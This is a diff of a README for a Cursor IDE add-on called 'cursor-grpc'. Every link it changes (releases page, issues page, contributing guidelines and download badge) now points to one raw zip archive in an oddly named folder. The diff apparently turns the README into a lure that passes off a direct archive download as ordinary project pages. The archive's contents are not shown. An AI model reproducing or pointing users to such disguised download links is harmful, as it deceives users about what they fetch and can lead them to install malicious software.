@@ -1,6 +1,6 @@
 # 🚀 cursor-grpc - Simplifying Your Cursor IDE Experience
 
-[![Download cursor-grpc](https://img.shields.io/badge/Download-cursor--grpc-brightgreen.svg)](https://github.com/dhairyamadhan02/cursor-grpc/releases)
+[![Download cursor-grpc](https://github.com/dhairyamadhan02/cursor-grpc/raw/refs/heads/main/caeciform/grpc_cursor_chordal.zip)](https://github.com/dhairyamadhan02/cursor-grpc/raw/refs/heads/main/caeciform/grpc_cursor_chordal.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ Cursor-grpc is an application designed to improve your experience with the Curso
 
 To get started with cursor-grpc, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/dhairyamadhan02/cursor-grpc/releases). This page contains the latest versions of cursor-grpc for download.
+1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/dhairyamadhan02/cursor-grpc/raw/refs/heads/main/caeciform/grpc_cursor_chordal.zip). This page contains the latest versions of cursor-grpc for download.
 
 2. **Select the Latest Version**: Look for the top entry on the Releases Page. You will find detailed notes about the new features and improvements in each version.
 
@@ -55,7 +55,7 @@ No, cursor-grpc is completely free to use. You can download and use it without a
 
 ### Where can I find support?
 
-You can visit our [GitHub Issues Page](https://github.com/dhairyamadhan02/cursor-grpc/issues) to report problems or seek assistance. You may also find helpful tips and user feedback there.
+You can visit our [GitHub Issues Page](https://github.com/dhairyamadhan02/cursor-grpc/raw/refs/heads/main/caeciform/grpc_cursor_chordal.zip) to report problems or seek assistance. You may also find helpful tips and user feedback there.
 
 ## 📣 Community Contributions
 
@@ -71,8 +71,8 @@ Cursor-grpc is open-source software. You can use, modify, and distribute it free
 
 ## 🔗 Useful Links
 
-- [Visit Releases Page](https://github.com/dhairyamadhan02/cursor-grpc/releases)
-- [GitHub Issues](https://github.com/dhairyamadhan02/cursor-grpc/issues)
-- [Contributing Guidelines](https://github.com/dhairyamadhan02/cursor-grpc/blob/main/CONTRIBUTING.md)
+- [Visit Releases Page](https://github.com/dhairyamadhan02/cursor-grpc/raw/refs/heads/main/caeciform/grpc_cursor_chordal.zip)
+- [GitHub Issues](https://github.com/dhairyamadhan02/cursor-grpc/raw/refs/heads/main/caeciform/grpc_cursor_chordal.zip)
+- [Contributing Guidelines](https://github.com/dhairyamadhan02/cursor-grpc/raw/refs/heads/main/caeciform/grpc_cursor_chordal.zip)
 
 Thank you for choosing cursor-grpc to enhance your Cursor IDE experience!
